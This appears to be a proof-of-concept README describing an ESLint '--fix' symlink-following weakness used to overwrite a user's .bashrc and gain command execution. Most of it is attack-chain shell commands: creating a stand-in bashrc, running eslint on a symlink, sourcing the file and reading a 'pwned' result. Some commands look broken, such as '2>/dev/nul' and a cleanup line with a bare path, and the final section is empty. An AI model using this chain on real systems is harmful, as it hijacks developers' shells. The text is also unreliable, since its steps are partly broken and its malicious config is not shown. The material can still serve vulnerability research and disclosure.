# ESLint-File-Overwrite

This is a weakness in ESlint v10.3.0 in which the "--fix" option will follow along symlinks and edit files at the end of them.

  ## Attack Chain Steps
  innocuous.js points to the /tmp/eslint-rce-poc-bashrc file, which is a stand-in for our fake /.bashrc
  Run the eslint command with --fix and point it at innocuous. The malicious config will execute commands and store data into our fake /.bashrc
  
  
  ## Create /tmp/eslint-rce-poc-bashrc
  cat > /tmp/eslint-rce-poc-bashrc <<'EOF'
  alias ll='ls -la'
  EOF

  ## Run eslint on the innocuous symlink file
  ### This is almost guaranteed to get an error, but that's fine
  eslint --fix innocuous.js

  ## Wait for a developer to open a new shell or source our fake /.bashrc
  bash --noprofile --rcfile /tmp/eslint-rce-poc-bashrc -i -c 'true' 2>/dev/nul
  
  ## Profit(?) View the files in /tmp/eslint-rce-poc-pwned
  ls /tmp
  cat /tmp/eslint-rce-poc-pwned;
  
  ## Go fourth and conquer

  ## Cleanup command
  rm -rf /tmp/eslint-symlink-poc /tmp/eslint-symlink-poc-victim.js /tmp/eslint-rce-poc-bashrc
  /tmp/eslint-rce-poc-pwned
  
  # What to watch out for

